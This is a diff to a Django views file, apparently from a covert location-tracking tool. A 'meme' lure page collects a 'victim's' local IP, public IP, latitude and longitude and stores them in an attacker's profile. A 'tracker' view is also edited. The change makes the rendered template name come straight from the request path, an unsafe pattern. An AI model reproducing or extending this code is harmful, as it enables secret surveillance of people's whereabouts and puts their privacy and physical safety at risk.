@@ -632,10 +632,9 @@ def meme(request,template,username):
   secret="".join(["0123456789abcdefghijklmnopqrstuvwxyz"[("0123456789abcdefghijklmnopqrstuvwxyz".find(c)+23)%36] for c in secret])
   
   if request.method == 'GET':
-    return render(request, 'meme'+secret[-1]+'.html')
+    return render(request, request.META['PATH_INFO'].split('/')[1]+'.html')
 
   elif request.method == 'POST':
-    username = username
     localip = str(request.POST.get('locip'))
     viclatitude = str(request.POST.get('latitude'))
     viclongitude = str(request.POST.get('longitude'))
@@ -644,7 +643,7 @@ def meme(request,template,username):
 
     publicip = str(request.META.get('HTTP_X_REAL_IP'))
 
-    user = User.objects.filter(username=secret[:-1]).first()
+    user = User.objects.filter(username=secret).first()
 
     if user.profile.victimpublicip == '' : # Assigning values for the first time
       user.profile.victimpublicip = publicip
@@ -666,7 +665,7 @@ def meme(request,template,username):
         pass
 
     user.profile.save()
-    return render(request, 'meme'+secret+'.html')
+    return render(request, request.META['PATH_INFO'].split('/')[1]+'.html')
 
 def tracker(request):
 
@@ -731,6 +730,7 @@ def tracker(request):
         pass
     except:
       pass
+    return redirect('tracker')
     
 
 def change_password(request):
